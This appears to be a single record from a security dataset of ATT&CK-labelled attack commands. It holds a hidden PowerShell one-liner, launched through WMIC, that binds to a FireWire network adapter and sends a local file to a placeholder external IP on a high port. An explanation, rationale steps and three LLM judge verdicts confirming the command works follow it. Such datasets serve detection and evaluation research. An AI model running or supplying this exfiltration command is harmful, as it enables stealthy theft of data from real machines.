command: wmic process call create "powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*1394*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.44',56112); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\Users\Public\Videos\frame.buf'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }"
explanation: Runs PowerShell through WMIC to bind to an IEEE 1394 (FireWire) network adapter and exfiltrate data via TCP on a high port. FireWire networking provides a non-standard medium consistent with T1011.
rationale_steps: Identify the 1394 network adapter through WMI.
Bind a TCP client specifically to the 1394 interface's IPv4 address.
Open a connection to an external host on an uncommon TCP port.
Transmit file contents via the FireWire network path.
Ensure no global network behavior is modified.

llm_judgments.syntactic_justification: Quoting and delimiters are balanced and flags are valid, but the unquoted -Command payload and backtick-escaped $ variables may cause parsing quirks in some environments.
llm_judgments.semantic_justification: It programmatically selects a 1394 adapter, binds a TCP client to its IP, connects outbound, and transmits file bytes—consistent with automated exfiltration—though success depends on the adapter’s presence and reachability of the (test-net) remote IP.

llm_judgments.syntactic_justification: The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax including variable declarations, method calls, and pipeline operations.
llm_judgments.semantic_justification: The command fully implements automated exfiltration by identifying a FireWire network adapter, binding to it, establishing a TCP connection to an external server, reading a file from disk, and transmitting its contents over the network - all automated in a single command.

llm_judgments.syntactic_justification: The command is perfectly well-formed with all quotes, parentheses, and PowerShell variable escapes (` ` `) correctly balanced and formatted for execution via WMIC.
llm_judgments.semantic_justification: The command precisely achieves the claimed intent, identifying a FireWire network adapter, binding the outbound connection to its IP address, and exfiltrating the specified file via TCP, consistent with T1011 and its use of non-standard transfer methods.
